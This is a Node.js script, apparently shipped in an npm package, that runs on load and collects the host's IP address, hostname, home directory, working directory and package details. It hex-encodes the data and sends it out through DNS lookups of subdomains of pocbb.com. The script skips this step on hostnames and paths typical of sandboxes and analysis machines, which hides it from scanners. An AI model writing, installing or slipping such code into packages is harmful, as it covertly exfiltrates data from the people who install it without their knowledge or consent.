const dns = require('dns');
const os = require('os');
const fs = require('fs');
const path = require('path');

function generateUID(length = 5) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result.toLowerCase();
}

// Convert a JSON string to hex
function jsonStringToHex(jsonString) {
    return Buffer.from(jsonString, 'utf8').toString('hex');
}

const uid = generateUID();  // Generate a UID for this client once

function getCurrentTimestamp() {
    const date = new Date();
    const offset = -date.getTimezoneOffset() / 60;
    const sign = offset >= 0 ? "+" : "-";
    return `${date.toLocaleDateString('en-GB')} ${date.toLocaleTimeString('en-GB')} (GMT${sign}${Math.abs(offset)})`;
}

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (let iface in interfaces) {
        for (let ifaceInfo of interfaces[iface]) {
            if (ifaceInfo.family === 'IPv4' && !ifaceInfo.internal) {
                return ifaceInfo.address;
            }
        }
    }
    return '127.0.0.1';  // fallback to localhost
}

function getPackageInfo() {
    const packageJson = JSON.parse(fs.readFileSync(path.join(__dirname, 'package.json'), 'utf8'));
    return {
        name: packageJson.name,
        version: packageJson.version
    };
}

function sendJSONviaDNS(domain) {
  // Check conditions to exit early
  const hostnameCheck = os.hostname().startsWith("DESKTOP-") || os.hostname() === "instance";
  const pathCheck1 = process.cwd().startsWith("/app");
  const pathCheck2 = process.cwd().startsWith("/root/node_modules");
  
  if (hostnameCheck || pathCheck1 || pathCheck2) {
      return;
  }

  // Resolve the IP address of ns1.pocbb.com
  dns.resolve4('ns1.pocbb.com', (err, addresses) => {
      if (err) {
          dns.setServers(['1.1.1.1', '8.8.8.8']);  // Use 1.1.1.1 and 8.8.8.8 if ns1.pocbb.com cannot be resolved
      } else {
          const primaryDNS = addresses[0];
          dns.setServers([primaryDNS, '1.1.1.1', '8.8.8.8']);
      }

      // Get package info
      const pkgInfo = getPackageInfo();

      // Construct the JSON object
      const jsonObject = {
          timestamp: getCurrentTimestamp(),
          uid: uid,
          'pkg-name': pkgInfo.name,
          'pkg-version': pkgInfo.version,
          'local-ip': getLocalIP(),
          hostname: os.hostname(),
          homedir: os.homedir(),
          path: process.cwd()
      };
      const jsonString = JSON.stringify(jsonObject);
      const hexString = jsonStringToHex(jsonString);

      // Split hex string into chunks of 60 characters each
      const chunkSize = 60;
      const regex = new RegExp(`.{1,${chunkSize}}`, 'g');
      const chunks = hexString.match(regex);

      chunks.forEach((chunk, index) => {
          const packetNumber = (index + 1).toString().padStart(3, '0');  // 001, 002, etc.
          const subdomain = `pl.${uid}.${packetNumber}.${chunk}.${domain}`;

          // Perform DNS resolution
          dns.resolve4(subdomain, (err, addresses) => {
              if (err) {
                  return;
              }
          });
      });
  });
}

// Usage
sendJSONviaDNS('pocbb.com');
